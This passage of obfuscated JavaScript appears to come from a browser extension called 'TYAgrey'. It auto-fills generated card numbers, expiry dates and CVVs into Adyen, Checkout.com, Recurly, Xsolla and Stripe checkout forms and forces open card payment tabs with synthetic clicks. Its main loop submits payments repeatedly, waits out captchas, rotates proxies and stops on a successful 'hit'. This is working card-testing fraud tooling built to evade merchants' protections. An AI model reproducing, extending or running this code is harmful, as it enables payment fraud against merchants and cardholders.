    const _0x13c6bb = document.querySelectorAll("iframe[src*=\"adyen\"], iframe[name*=\"adyen\"], iframe[id*=\"adyen\"], iframe[title*=\"secure\"]");
    for (const _0x351e50 of _0x13c6bb) {
      try {
        const _0x5cc873 = _0x351e50.getBoundingClientRect();
        if (_0x5cc873.width > 0 && _0x5cc873.height > 0) {
          _0x351e50.click();
          await _0x4d9348(50);
        }
      } catch (_0x5a10cc) {}
    }
    const _0x4d1274 = ["[data-cse=\"encryptedCardNumber\"]", "[data-fieldtype=\"encryptedCardNumber\"]", "input[aria-label*=\"card number\" i]", "input[aria-label*=\"cardnumber\" i]", "input[placeholder*=\"card number\" i]", "input[name=\"encryptedCardNumber\"]", "input[id*=\"cardNumber\" i]", ".adyen-checkout__card__cardNumber__input input", ".adyen-checkout__input input"];
    for (const _0x1ede74 of _0x4d1274) {
      const _0x4e4297 = document.querySelector(_0x1ede74);
      if (_0x4e4297) {
        simulateInput(_0x4e4297, _0x348daf);
        await _0x4d9348(20);
        break;
      }
    }
    const _0x5a2ee0 = ["[data-cse=\"encryptedExpiryDate\"]", "[data-fieldtype=\"encryptedExpiryDate\"]", "input[aria-label*=\"expiry\" i]", "input[placeholder*=\"MM/YY\" i]", "input[placeholder*=\"MM / YY\" i]", ".adyen-checkout__card__exp-date__input input"];
    for (const _0x3a19a4 of _0x5a2ee0) {
      const _0x320f5c = document.querySelector(_0x3a19a4);
      if (_0x320f5c) {
        simulateInput(_0x320f5c, _0x5db4c1 + "/" + _0x442f7d);
        await _0x4d9348(20);
        break;
      }
    }
    const _0x4e013f = ["[data-cse=\"encryptedSecurityCode\"]", "[data-fieldtype=\"encryptedSecurityCode\"]", "input[aria-label*=\"cvc\" i]", "input[aria-label*=\"cvv\" i]", "input[aria-label*=\"security code\" i]", "input[placeholder*=\"cvc\" i]", ".adyen-checkout__card__cvc__input input"];
    for (const _0x3eb541 of _0x4e013f) {
      const _0x489c9e = document.querySelector(_0x3eb541);
      if (_0x489c9e) {
        simulateInput(_0x489c9e, _0x3e47a4);
        await _0x4d9348(20);
        break;
      }
    }
    const _0x3c5bdd = ["input[aria-label*=\"holder\" i]", "input[placeholder*=\"holder\" i]", ".adyen-checkout__card__holderName__input input"];
    for (const _0x4bc4ff of _0x3c5bdd) {
      const _0x28b5b2 = document.querySelector(_0x4bc4ff);
      if (_0x28b5b2) {
        simulateInput(_0x28b5b2, "TYAgrey");
        await _0x4d9348(20);
        break;
      }
    }
  }
  async function fillCheckoutForm(_0x2e6bc9, _0x171917, _0x1352d9, _0x56656d) {
    const _0x2a6972 = _0x30547e => new Promise(_0xa9349b => setTimeout(_0xa9349b, _0x30547e));
    const _0x207c36 = document.querySelectorAll("iframe[src*=\"checkout\"], iframe[title*=\"card number\" i], iframe[title*=\"secure\"]");
    for (const _0x4de50f of _0x207c36) {
      try {
        const _0x3adf8a = _0x4de50f.getBoundingClientRect();
        if (_0x3adf8a.width > 0 && _0x3adf8a.height > 0) {
          _0x4de50f.click();
          await _0x2a6972(50);
        }
      } catch (_0x3e4d40) {}
    }
    const _0x23833c = ["input[name=\"card-number\"]", "input[id=\"card-number\"]", "input[autocomplete=\"cc-number\"]", "input[placeholder*=\"card number\" i]", "input[data-testid=\"card-number\"]", ".frames-input[name=\"cardnumber\"]"];
    for (const _0x3102b0 of _0x23833c) {
      const _0xf0a991 = document.querySelector(_0x3102b0);
      if (_0xf0a991) {
        simulateInput(_0xf0a991, _0x2e6bc9);
        await _0x2a6972(20);
        break;
      }
    }
    const _0x51dc1b = ["input[name=\"expiry-date\"]", "input[id=\"expiry-date\"]", "input[autocomplete=\"cc-exp\"]", "input[placeholder*=\"MM/YY\" i]", "input[placeholder*=\"MM / YY\" i]", ".frames-input[name=\"expiry-date\"]"];
    for (const _0x365dd0 of _0x51dc1b) {
      const _0x2f7564 = document.querySelector(_0x365dd0);
      if (_0x2f7564) {
        simulateInput(_0x2f7564, _0x171917 + "/" + _0x1352d9);
        await _0x2a6972(20);
        break;
      }
    }
    const _0x32a7d9 = ["input[name=\"cvv\"]", "input[id=\"cvv\"]", "input[autocomplete=\"cc-csc\"]", "input[placeholder*=\"cvv\" i]", "input[placeholder*=\"cvc\" i]", ".frames-input[name=\"cvv\"]"];
    for (const _0x38cb3f of _0x32a7d9) {
      const _0x18579e = document.querySelector(_0x38cb3f);
      if (_0x18579e) {
        simulateInput(_0x18579e, _0x56656d);
        await _0x2a6972(20);
        break;
      }
    }
  }
  async function fillRecurlyForm(_0x2614e2, _0x2c5eda, _0x33e901, _0x4d2453) {
    const _0x3ca222 = _0x1b9f94 => new Promise(_0x3ce7a3 => setTimeout(_0x3ce7a3, _0x1b9f94));
    const _0x3690d7 = ["input[data-recurly=\"number\"]", "input[name=\"number\"]", "input[autocomplete=\"cc-number\"]", "input[placeholder*=\"card number\" i]", "[data-recurly=\"number\"] input"];
    for (const _0x529dd3 of _0x3690d7) {
      const _0x26e0c1 = document.querySelector(_0x529dd3);
      if (_0x26e0c1) {
        simulateInput(_0x26e0c1, _0x2614e2);
        await _0x3ca222(20);
        break;
      }
    }
    const _0x4c3723 = ["input[data-recurly=\"month\"]", "select[data-recurly=\"month\"]", "input[name=\"month\"]", "select[name=\"month\"]"];
    for (const _0x4dd1fa of _0x4c3723) {
      const _0x2a824c = document.querySelector(_0x4dd1fa);
      if (_0x2a824c) {
        if (_0x2a824c.tagName === "SELECT") {
          simulateSelectChange(_0x2a824c, _0x2c5eda);
        } else {
          simulateInput(_0x2a824c, _0x2c5eda);
        }
        await _0x3ca222(20);
        break;
      }
    }
    const _0x399a7f = ["input[data-recurly=\"year\"]", "select[data-recurly=\"year\"]", "input[name=\"year\"]", "select[name=\"year\"]"];
    for (const _0x481423 of _0x399a7f) {
      const _0x553e00 = document.querySelector(_0x481423);
      if (_0x553e00) {
        if (_0x553e00.tagName === "SELECT") {
          simulateSelectChange(_0x553e00, _0x33e901);
        } else {
          simulateInput(_0x553e00, _0x33e901);
        }
        await _0x3ca222(20);
        break;
      }
    }
    const _0x7dbd99 = ["input[data-recurly=\"cvv\"]", "input[name=\"cvv\"]", "input[autocomplete=\"cc-csc\"]", "input[placeholder*=\"cvv\" i]", "[data-recurly=\"cvv\"] input"];
    for (const _0x80ed1e of _0x7dbd99) {
      const _0x42b730 = document.querySelector(_0x80ed1e);
      if (_0x42b730) {
        simulateInput(_0x42b730, _0x4d2453);
        await _0x3ca222(20);
        break;
      }
    }
  }
  async function fillXsollaForm(_0x14b881, _0x528268, _0xc4879b, _0x222fe0) {
    const _0x2cb47d = _0x56999f => new Promise(_0x43351 => setTimeout(_0x43351, _0x56999f));
    const _0x300463 = ["input[name=\"card_number\"]", "input[id=\"card_number\"]", "input[autocomplete=\"cc-number\"]", "input[placeholder*=\"card number\" i]", "input[data-field=\"card_number\"]"];
    for (const _0x5a23a2 of _0x300463) {
      const _0x8f90c1 = document.querySelector(_0x5a23a2);
      if (_0x8f90c1) {
        simulateInput(_0x8f90c1, _0x14b881);
        await _0x2cb47d(20);
        break;
      }
    }
    const _0x2d9903 = ["select[name=\"card_month\"]", "select[id=\"card_month\"]", "input[name=\"card_month\"]", "select[data-field=\"card_month\"]"];
    for (const _0x538303 of _0x2d9903) {
      const _0x3c5c71 = document.querySelector(_0x538303);
      if (_0x3c5c71) {
        if (_0x3c5c71.tagName === "SELECT") {
          simulateSelectChange(_0x3c5c71, _0x528268);
        } else {
          simulateInput(_0x3c5c71, _0x528268);
        }
        await _0x2cb47d(20);
        break;
      }
    }
    const _0x398b32 = ["select[name=\"card_year\"]", "select[id=\"card_year\"]", "input[name=\"card_year\"]", "select[data-field=\"card_year\"]"];
    for (const _0x4767df of _0x398b32) {
      const _0x1a5095 = document.querySelector(_0x4767df);
      if (_0x1a5095) {
        if (_0x1a5095.tagName === "SELECT") {
          simulateSelectChange(_0x1a5095, _0xc4879b);
        } else {
          simulateInput(_0x1a5095, _0xc4879b);
        }
        await _0x2cb47d(20);
        break;
      }
    }
    const _0x5b497e = ["input[name=\"card_cvv\"]", "input[id=\"card_cvv\"]", "input[autocomplete=\"cc-csc\"]", "input[placeholder*=\"cvv\" i]", "input[data-field=\"card_cvv\"]"];
    for (const _0x23b25c of _0x5b497e) {
      const _0x4472e0 = document.querySelector(_0x23b25c);
      if (_0x4472e0) {
        simulateInput(_0x4472e0, _0x222fe0);
        await _0x2cb47d(20);
        break;
      }
    }
    const _0xea8d27 = ["input[name=\"card_holder\"]", "input[id=\"card_holder\"]", "input[placeholder*=\"holder\" i]"];
    for (const _0x52c02d of _0xea8d27) {
      const _0x363f95 = document.querySelector(_0x52c02d);
      if (_0x363f95) {
        simulateInput(_0x363f95, "TYAgrey");
        await _0x2cb47d(20);
        break;
      }
    }
  }
  async function performCheckoutBinLookup(_0xe74e72) {
    try {
      const _0x2c6410 = (_0xe74e72 || "").replace(/\s/g, "").substring(0, 8);
      if (!_0x2c6410 || _0x2c6410.length < 6) {
        return null;
      }
      if (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.sendMessage) {
        const _0x1a067e = await new Promise(_0x43c4d4 => {
          chrome.runtime.sendMessage({
            type: "API_REQUEST",
            endpoint: "bin-lookup",
            payload: {
              bin: _0x2c6410
            }
          }, _0x43c4d4);
          setTimeout(() => _0x43c4d4(null), 3000);
        });
        if (_0x1a067e && _0x1a067e.success && _0x1a067e.data) {
          return _0x1a067e.data;
        }
      }
      return getClientSideBinInfo(_0x2c6410);
    } catch (_0x559b04) {
      return null;
    }
  }
  function getClientSideBinInfo(_0x2bce60) {
    const _0x541ea6 = _0x2bce60.charAt(0);
    if (_0x541ea6 === "4") {
      return {
        scheme: "visa",
        type: "credit",
        country: "US",
        bank: "Visa"
      };
    } else if (_0x541ea6 === "5") {
      return {
        scheme: "mastercard",
        type: "credit",
        country: "US",
        bank: "Mastercard"
      };
    } else if (_0x541ea6 === "3") {
      return {
        scheme: "amex",
        type: "credit",
        country: "US",
        bank: "Amex"
      };
    } else if (_0x541ea6 === "6") {
      return {
        scheme: "discover",
        type: "credit",
        country: "US",
        bank: "Discover"
      };
    }
    return {
      scheme: "unknown",
      type: "credit",
      country: "US",
      bank: "Unknown"
    };
  }
  function isSubmitButtonAvailable() {
    const _0x20340b = document.querySelector(".SubmitButton-IconContainer");
    if (_0x20340b) {
      const _0x367ea4 = _0x20340b.closest(".SubmitButton");
      if (_0x367ea4) {
        const _0xceea1f = window.getComputedStyle(_0x367ea4);
        if (!_0x367ea4.disabled && !_0x367ea4.classList.contains("SubmitButton--incomplete") && _0xceea1f.opacity !== "0" && _0xceea1f.visibility !== "hidden" && _0xceea1f.display !== "none") {
          return true;
        }
      }
    }
    if (isInvoiceStripePage()) {
      const _0x530ad5 = document.querySelectorAll("button");
      for (const _0x24c783 of _0x530ad5) {
        const _0x1a7207 = (_0x24c783.textContent || "").trim().toLowerCase();
        if ((_0x1a7207 === "pay" || _0x1a7207.startsWith("pay ") || _0x1a7207.includes("pay $")) && !_0x24c783.disabled) {
          return true;
        }
      }
    }
    return false;
  }
  async function waitForSubmitButton(_0x35a423 = 10000) {
    const _0x27b352 = Date.now();
    return new Promise(_0x26c270 => {
      const _0x30b880 = () => {
        if (isSubmitButtonAvailable()) {
          _0x26c270(true);
        } else if (!isAutoSubmitting || Date.now() - _0x27b352 > _0x35a423) {
          _0x26c270(false);
        } else {
          setTimeout(_0x30b880, 50);
        }
      };
      _0x30b880();
    });
  }
  function isCheckoutTimedOut() {
    const _0x1446b3 = document.body ? document.body.innerText.toLowerCase() : "";
    return _0x1446b3.includes("you're all done here") || _0x1446b3.includes("checkout session has timed out") || _0x1446b3.includes("session has timed out");
  }
  function hideOverlay() {
    destroyTYAgreyOverlay();
    const _0x4a4b69 = document.querySelector(".card-generator-overlay");
    if (_0x4a4b69) {
      _0x4a4b69.remove();
    }
    document.getElementById("ccModal")?.remove();
    document.getElementById("bgInfoModal")?.remove();
    document.getElementById("proxyModal")?.remove();
    document.getElementById("ipFraudModal")?.remove();
    isDashboardActive = false;
  }
  async function handleAutoSubmit() {
    while (isAutoSubmitting && !hasHit) {
      if (hasHit) {
        break;
      }
      if (isCheckoutTimedOut()) {
        hideOverlay();
        autoStopOnError("checkout_timed_out");
        break;
      }
      if (checkCaptchaVisible()) {
        while (checkCaptchaVisible() && isAutoSubmitting && !hasHit) {
          await new Promise(_0x467705 => setTimeout(_0x467705, Math.round(hitSpeed * 500)));
        }
        if (!isAutoSubmitting || hasHit) {
          break;
        }
        await new Promise(_0x5ba8cc => setTimeout(_0x5ba8cc, Math.round(hitSpeed * 500)));
      }
      currentCardProcessed = false;
      cardAttemptStartTime = Date.now();
      try {
        await autoFillForm();
      } catch (_0x487439) {
        console.error("[TYAgrey] autoFillForm error:", _0x487439);
      }
      if (window.generatedCardFull) {
        const _0x52c453 = window.generatedCardFull.split("|");
        addToHistory(_0x52c453[0], _0x52c453[1], _0x52c453[2], _0x52c453[3], "ATTEMPTED");
      }
      if (customCheckoutActive) {
        updateCustomCheckoutStats("charged");
      }
      if (hasHit) {
        break;
      }
      await new Promise(_0x42f715 => setTimeout(_0x42f715, Math.round(hitSpeed * 100)));
      let _0x56b51f = false;
      try {
        _0x56b51f = await waitForSubmitButton();
      } catch (_0x5bd3bc) {
        console.error("[TYAgrey] waitForSubmitButton error:", _0x5bd3bc);
      }
      if (!isAutoSubmitting || hasHit) {
        break;
      }
      const _0x1e4df6 = window.location.hostname.toLowerCase();
      if (!_0x56b51f && _0x1e4df6.includes("expressvpn")) {
        const _0x540bb9 = document.querySelectorAll("button[type=\"submit\"], button[class*=\"submit\"], button[class*=\"pay\"], button[class*=\"subscribe\"]");
        for (const _0x4ae156 of _0x540bb9) {
          const _0x4061e3 = _0x4ae156.getBoundingClientRect();
          if (_0x4061e3.width > 0 && _0x4061e3.height > 0) {
            _0x4ae156.click();
            _0x56b51f = true;
            break;
          }
        }
      }
      if (!isAutoSubmitting || hasHit || !_0x56b51f) {
        break;
      }
      const _0x52194a = document.querySelector(".SubmitButton-IconContainer");
      if (_0x52194a) {
        const _0x31c8cc = _0x52194a.closest(".SubmitButton") || _0x52194a.closest("button");
        if (_0x31c8cc) {
          _0x31c8cc.click();
        }
      }
      if (checkCaptchaVisible()) {
        while (checkCaptchaVisible() && isAutoSubmitting && !hasHit) {
          await new Promise(_0x2c8f90 => setTimeout(_0x2c8f90, Math.round(hitSpeed * 500)));
        }
        if (!isAutoSubmitting || hasHit) {
          break;
        }
        await new Promise(_0x33d4bb => setTimeout(_0x33d4bb, Math.round(hitSpeed * 500)));
      }
      await waitForResponse(Math.max(4000, Math.round(hitSpeed * 8000)));
      if (!isAutoSubmitting || hasHit) {
        break;
      }
      if (_0x1e4df6.includes("expressvpn")) {
        currentCardProcessed = true;
      }
      if (window.tyagreyProxy && window.tyagreyProxy.autoRotate) {
        if (typeof updateBottomIpBar !== "undefined") {
          await window.tyagreyProxy.rotateToNextProxy(updateBottomIpBar);
        } else {
          await window.tyagreyProxy.rotateToNextProxy();
        }
        await new Promise(_0x1f7e3a => setTimeout(_0x1f7e3a, Math.round(hitSpeed * 500)));
      }
      await new Promise(_0x2c5f4e => setTimeout(_0x2c5f4e, Math.round(hitSpeed * 300)));
      await waitForSubmitButton();
    }
    if (hasHit) {
      stopAutoSubmit();
    }
  }
  function simulateRealClick(_0x536af7) {
    if (!_0x536af7) {
      return false;
    }
    if (_0x536af7.tagName === "INPUT") {
      const _0x1e3ffd = _0x536af7.closest("label") || document.querySelector("label[for=\"" + _0x536af7.id + "\"]");
      if (_0x1e3ffd) {
        _0x1e3ffd.click();
        return true;
      }
      const _0x432a79 = _0x536af7.closest("[role=\"radio\"]") || _0x536af7.closest("[role=\"tab\"]") || _0x536af7.closest("[class*=\"Tab\"]") || _0x536af7.closest("[class*=\"Option\"]") || _0x536af7.closest("[class*=\"Method\"]") || _0x536af7.parentElement;
      if (_0x432a79 && _0x432a79 !== _0x536af7) {
        _0x432a79.click();
        return true;
      }
      _0x536af7.checked = true;
      _0x536af7.dispatchEvent(new MouseEvent("mousedown", {
        bubbles: true,
        cancelable: true
      }));
      _0x536af7.dispatchEvent(new MouseEvent("mouseup", {
        bubbles: true,
        cancelable: true
      }));
      _0x536af7.dispatchEvent(new MouseEvent("click", {
        bubbles: true,
        cancelable: true
      }));
      _0x536af7.dispatchEvent(new Event("input", {
        bubbles: true
      }));
      _0x536af7.dispatchEvent(new Event("change", {
        bubbles: true
      }));
      return true;
    }
    _0x536af7.dispatchEvent(new MouseEvent("mousedown", {
      bubbles: true,
      cancelable: true,
      view: window
    }));
    _0x536af7.dispatchEvent(new MouseEvent("mouseup", {
      bubbles: true,
      cancelable: true,
      view: window
    }));
    _0x536af7.dispatchEvent(new MouseEvent("click", {
      bubbles: true,
      cancelable: true,
      view: window
    }));
    return true;
  }
  let hasClickedCardTab = false;
  function clickCardPaymentTab() {
    if (hasClickedCardTab) {
      return;
    }
    try {
      const _0x282388 = document.querySelectorAll("label, [role=\"radio\"], [role=\"tab\"], [class*=\"Tab\"], [class*=\"Option\"], button");
      for (const _0x305e79 of _0x282388) {
        const _0x388201 = (_0x305e79.textContent || _0x305e79.innerText || "").trim();
        if (_0x388201 === "Card" || _0x388201.startsWith("Card ") || _0x388201.match(/^Card\s*$/i) || _0x388201.includes("Subscribe with Card") || _0x388201.includes("Pay with Card")) {
          const _0x54f068 = _0x305e79.getBoundingClientRect();
          if (_0x54f068.width > 0 && _0x54f068.height > 0) {
            simulateRealClick(_0x305e79);
            hasClickedCardTab = true;
            const _0x173e44 = _0x305e79.querySelector("input[type=\"radio\"]");
            if (_0x173e44) {
              _0x173e44.checked = true;
              _0x173e44.dispatchEvent(new Event("change", {
                bubbles: true
              }));
            }
            return true;
          }
        }
      }
      const _0x1e0f5d = document.querySelector("input[value=\"card\"], input[name*=\"payment\"][value=\"card\"]");
      if (_0x1e0f5d) {
        const _0x12c613 = _0x1e0f5d.closest("label") || _0x1e0f5d.closest("[role=\"radio\"]") || _0x1e0f5d.closest("[role=\"tab\"]") || _0x1e0f5d.closest("[class*=\"Tab\"]") || _0x1e0f5d.closest("[class*=\"Option\"]") || _0x1e0f5d.closest("[class*=\"Method\"]") || _0x1e0f5d.closest("div[class]");
        if (_0x12c613 && _0x12c613 !== _0x1e0f5d) {
          simulateRealClick(_0x12c613);
        }
        _0x1e0f5d.checked = true;
        _0x1e0f5d.dispatchEvent(new Event("change", {
          bubbles: true
        }));
        _0x1e0f5d.dispatchEvent(new Event("input", {
          bubbles: true
        }));
        hasClickedCardTab = true;
        return true;
      }
      const _0x5b4383 = ["[data-testid=\"card-tab\"]", "[data-testid=\"CARD-tab\"]", "[data-testid*=\"card\" i]", "button[data-value=\"card\"]", "[role=\"tab\"][data-value=\"card\"]", "[class*=\"PaymentMethodSelector\"] [class*=\"Tab\"]:first-child", "[class*=\"PaymentMethod\"] button:first-child", "[class*=\"Tab\"][class*=\"card\" i]", ".p-TabList button:first-child", "[role=\"tablist\"] button:first-child", "[role=\"radiogroup\"] > div:first-child", "[aria-label*=\"Card\" i]"];
      for (const _0xf69f20 of _0x5b4383) {
        try {
          const _0x596941 = document.querySelector(_0xf69f20);
          if (_0x596941) {
            const _0x387ddf = _0x596941.getBoundingClientRect();
            if (_0x387ddf.width > 0 && _0x387ddf.height > 0) {
              simulateRealClick(_0x596941);
              hasClickedCardTab = true;
              return true;
            }
          }
        } catch (_0x59127a) {}
      }
      const _0x102bce = document.querySelector("[class*=\"PaymentMethod\"], [class*=\"payment-method\"], [role=\"radiogroup\"]");
      if (_0x102bce) {
        const _0xb69742 = _0x102bce.querySelector("input[type=\"radio\"], [role=\"radio\"]");
        if (_0xb69742) {
          const _0x30ee56 = _0xb69742.closest("label") || _0xb69742.closest("div") || _0xb69742;
          simulateRealClick(_0x30ee56);
          if (_0xb69742.tagName === "INPUT") {
            _0xb69742.checked = true;
            _0xb69742.dispatchEvent(new Event("change", {
              bubbles: true
            }));
          }
          hasClickedCardTab = true;
          return true;
        }
      }
      return false;
    } catch (_0x1e326c) {
      return false;
    }
  }
  function simulateRealTap(_0x509a00) {
    if (!_0x509a00) {
      return false;
    }
    const _0x2fdcd7 = _0x509a00.getBoundingClientRect();
    const _0x13f5ba = _0x2fdcd7.left + _0x2fdcd7.width / 2;
    const _0x2c2833 = _0x2fdcd7.top + _0x2fdcd7.height / 2;
    const _0x3580cb = document.elementFromPoint(_0x13f5ba, _0x2c2833) || _0x509a00;
    const _0xf56166 = {
      bubbles: true,
      cancelable: true,
      view: window,
      clientX: _0x13f5ba,
      clientY: _0x2c2833,
      screenX: _0x13f5ba + window.screenX,
      screenY: _0x2c2833 + window.screenY,
      button: 0,
      buttons: 1,
      detail: 1,
      composed: true
    };
    _0x3580cb.dispatchEvent(new MouseEvent("mouseenter", {
      ..._0xf56166,
      bubbles: false
    }));
    _0x3580cb.dispatchEvent(new MouseEvent("mouseover", _0xf56166));
    _0x3580cb.dispatchEvent(new MouseEvent("mousemove", _0xf56166));
    _0x3580cb.dispatchEvent(new MouseEvent("mousedown", _0xf56166));
    _0x3580cb.focus?.();
    _0x3580cb.dispatchEvent(new MouseEvent("mouseup", _0xf56166));
    _0x3580cb.dispatchEvent(new MouseEvent("click", _0xf56166));
    if (_0x3580cb !== _0x509a00) {
      _0x509a00.dispatchEvent(new MouseEvent("click", _0xf56166));
    }
    return true;
  }
  function forceClick(_0x44bf13) {
    if (!_0x44bf13) {
      return false;
    }
    const _0x4d7b6b = _0x44bf13.getBoundingClientRect();
    const _0x141364 = _0x4d7b6b.left + _0x4d7b6b.width / 2;
    const _0x2ae9db = _0x4d7b6b.top + _0x4d7b6b.height / 2;
    const _0x45b2bd = {
      bubbles: true,
      cancelable: true,
      view: window,
      clientX: _0x141364,
      clientY: _0x2ae9db,
      screenX: _0x141364 + window.screenX,
      screenY: _0x2ae9db + window.screenY,
      pointerId: 1,
      pointerType: "mouse",
      isPrimary: true,
      button: 0,
      buttons: 1,
      composed: true
    };
    _0x44bf13.dispatchEvent(new PointerEvent("pointerover", _0x45b2bd));
    _0x44bf13.dispatchEvent(new PointerEvent("pointerenter", {
      ..._0x45b2bd,
      bubbles: false
    }));
    _0x44bf13.dispatchEvent(new PointerEvent("pointerdown", _0x45b2bd));
    _0x44bf13.dispatchEvent(new PointerEvent("pointerup", _0x45b2bd));
    const _0x33a26f = new MouseEvent("click", {
      bubbles: true,
      cancelable: true,
      view: window,
      clientX: _0x141364,
      clientY: _0x2ae9db,
      screenX: _0x141364 + window.screenX,
      screenY: _0x2ae9db + window.screenY,
      button: 0,
      detail: 1,
      composed: true
    });
    _0x44bf13.dispatchEvent(_0x33a26f);
    _0x44bf13.click?.();
    return true;
  }
  async function openCardDrawer() {
    if (hasClickedCardTab) {
      return;
    }
    clickCardPaymentTab();
    const _0x5aec07 = _0x21af02 => new Promise(_0x9077e4 => setTimeout(_0x9077e4, _0x21af02));
    const _0x2df4ac = () => {
      const _0x2ecf2e = document.querySelectorAll("input");
      for (const _0x4af9b5 of _0x2ecf2e) {
        const _0xd51d7b = (_0x4af9b5.placeholder || "").toLowerCase();
        const _0x68b2c4 = (_0x4af9b5.getAttribute("aria-label") || "").toLowerCase();
        if (_0xd51d7b.includes("card number") || _0xd51d7b.includes("1234") || _0x68b2c4.includes("card number") || _0x68b2c4.includes("credit card")) {
          const _0xba8b8f = _0x4af9b5.getBoundingClientRect();
          if (_0xba8b8f.height > 10 && _0xba8b8f.width > 50) {
            return true;
          }
        }
      }
      const _0xf6cf91 = document.querySelectorAll("[class*=\"CardField\"], [class*=\"cardField\"], [class*=\"CardNumberField\"], [class*=\"card-number\"]");
      for (const _0x126b75 of _0xf6cf91) {
        const _0x31ccfb = _0x126b75.getBoundingClientRect();
        if (_0x31ccfb.height > 40 && _0x31ccfb.width > 100) {
          return true;
        }
      }
      const _0x5540a7 = document.querySelectorAll("label, span, div");
      for (const _0x3bf8df of _0x5540a7) {
        const _0x4c70a8 = (_0x3bf8df.textContent || "").trim().toLowerCase();
        if (_0x4c70a8 === "card number" || _0x4c70a8 === "card information") {
          const _0x2683b0 = _0x3bf8df.getBoundingClientRect();
          if (_0x2683b0.height > 0 && _0x2683b0.width > 0) {
            const _0x5536b6 = _0x3bf8df.closest("div");
            if (_0x5536b6) {
              const _0x327b76 = _0x5536b6.querySelector("input, iframe");
              if (_0x327b76) {
                const _0x60c314 = _0x327b76.getBoundingClientRect();
                if (_0x60c314.height > 10) {
                  return true;
                }
              }
            }
          }
        }
      }
      const _0x207914 = document.querySelector("input[value=\"card\"]");
      if (_0x207914) {
        let _0x153944 = _0x207914.closest("[class*=\"Option\"]") || _0x207914.closest("[class*=\"AccordionItem\"]") || _0x207914.closest("[role=\"radio\"]")?.parentElement;
        if (_0x153944) {
          const _0x8427cc = _0x153944.getBoundingClientRect();
          if (_0x8427cc.height > 150) {
            return true;
          }
        }
      }
      for (const _0xa000df of _0x2ecf2e) {
        const _0x20b4cf = (_0xa000df.placeholder || "").toLowerCase();
        if (_0x20b4cf.includes("mm") || _0x20b4cf.includes("yy") || _0x20b4cf.includes("cvc") || _0x20b4cf.includes("cvv")) {
          const _0x4fb546 = _0xa000df.getBoundingClientRect();
          if (_0x4fb546.height > 0) {
            return true;
          }
        }
      }
      return false;
    };
    const _0x20d6dc = document.querySelector("input[value=\"card\"]");
    if (!_0x20d6dc) {
      if (_0x2df4ac()) {
        hasClickedCardTab = true;
        return true;
      }
      return false;
    }
    if (_0x20d6dc.checked) {
      await _0x5aec07(80);
      if (_0x2df4ac()) {
        hasClickedCardTab = true;
        return true;
      }
    }
    const _0x21457c = () => {
      const _0x32b018 = [];
      const _0x187153 = document.querySelector("[class*=\"AccordionItemCover-title\"]:not([class*=\"Container\"])");
      const _0x23d64a = document.querySelector("[class*=\"AccordionItemCover-titleContai\"]");
      const _0xa30c8b = document.querySelectorAll("[class*=\"AccordionItem\"] [class*=\"title\"], [class*=\"Accordion\"] [class*=\"Title\"]");
      for (const _0x10a757 of _0xa30c8b) {
        const _0x167192 = (_0x10a757.textContent || "").toLowerCase();
        if (_0x167192.includes("card") && !_0x167192.includes("gift")) {
          _0x32b018.push(_0x10a757);
        }
      }
      const _0xe439e9 = _0x20d6dc.closest("[class*=\"AccordionItem\"]");
      if (_0xe439e9) {
        const _0x230b8a = _0xe439e9.querySelector("[class*=\"Cover\"], [class*=\"Header\"], [class*=\"Title\"]");
        if (_0x230b8a) {
          _0x32b018.push(_0x230b8a);
        }
        _0x32b018.push(_0xe439e9);
      }
      let _0x527fec = _0x20d6dc.parentElement;
      for (let _0x51bf3b = 0; _0x51bf3b < 5 && _0x527fec; _0x51bf3b++) {
        if (_0x527fec.tagName !== "BODY" && _0x527fec.tagName !== "HTML") {
          if (!_0x32b018.includes(_0x527fec)) {
            _0x32b018.push(_0x527fec);
          }
        }
        _0x527fec = _0x527fec.parentElement;
      }
      const _0x435f8e = _0x20d6dc.closest("label");
      const _0xf8aad3 = _0x20d6dc.closest("[role=\"radio\"]");
      const _0x343f2c = _0x20d6dc.closest("[class*=\"Option\"]");
      if (_0x435f8e && !_0x32b018.includes(_0x435f8e)) {
        _0x32b018.unshift(_0x435f8e);
      }
      if (_0xf8aad3 && !_0x32b018.includes(_0xf8aad3)) {
        _0x32b018.unshift(_0xf8aad3);
      }
      if (_0x343f2c && !_0x32b018.includes(_0x343f2c)) {
        _0x32b018.unshift(_0x343f2c);
      }
      return _0x32b018.filter(_0x97fe33 => {
        const _0xe32baa = _0x97fe33.getBoundingClientRect();
        return _0xe32baa.width > 0 && _0xe32baa.height > 0;
      });
    };
    const _0x14b90a = _0x21457c();
    for (let _0x23f919 = 1; _0x23f919 <= 3; _0x23f919++) {
      for (let _0x5cbf8f = 0; _0x5cbf8f < _0x14b90a.length; _0x5cbf8f++) {
        const _0x3c9018 = _0x14b90a[_0x5cbf8f];
        const _0x16088e = "" + _0x3c9018.tagName + (_0x3c9018.className ? "." + String(_0x3c9018.className).split(" ")[0].substring(0, 30) : "");
        forceClick(_0x3c9018);
        await _0x5aec07(60);
        if (_0x2df4ac()) {
          hasClickedCardTab = true;
          return true;
        }
        simulateRealTap(_0x3c9018);
        await _0x5aec07(60);
        _0x20d6dc.checked = true;
        _0x20d6dc.dispatchEvent(new Event("change", {
          bubbles: true
        }));
        await _0x5aec07(120);
        if (_0x2df4ac()) {
          hasClickedCardTab = true;
          return true;
        }
        _0x3c9018.click();
        await _0x5aec07(120);
        if (_0x2df4ac()) {
          hasClickedCardTab = true;
          return true;
        }
        _0x3c9018.scrollIntoView({
          behavior: "instant",
          block: "center"
        });
        await _0x5aec07(40);
        simulateRealTap(_0x3c9018);
        await _0x5aec07(120);
        if (_0x2df4ac()) {
          hasClickedCardTab = true;
          return true;
        }
      }
      _0x20d6dc.scrollIntoView({
        behavior: "instant",
        block: "center"
      });
      await _0x5aec07(40);
      simulateRealTap(_0x20d6dc);
      try {
        const _0x20d32d = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "checked").set;
        _0x20d32d.call(_0x20d6dc, true);
        _0x20d6dc.dispatchEvent(new Event("input", {
          bubbles: true
        }));
        _0x20d6dc.dispatchEvent(new Event("change", {
          bubbles: true
        }));
      } catch (_0x5c5eab) {}
      await _0x5aec07(200);
      if (_0x2df4ac()) {
        hasClickedCardTab = true;
        return true;
      }
      await _0x5aec07(60);
    }
    if (_0x2df4ac()) {
      hasClickedCardTab = true;
      return true;
    }
    return false;
  }
  let hasClickedInvoiceCardSection = false;
  async function handleInvoiceAutomation() {
    if (!isInvoiceStripePage()) {
      return;
    }
    const _0x38fef9 = _0x4b23f1 => new Promise(_0xd47a04 => setTimeout(_0xd47a04, _0x4b23f1));
    await _0x38fef9(300);
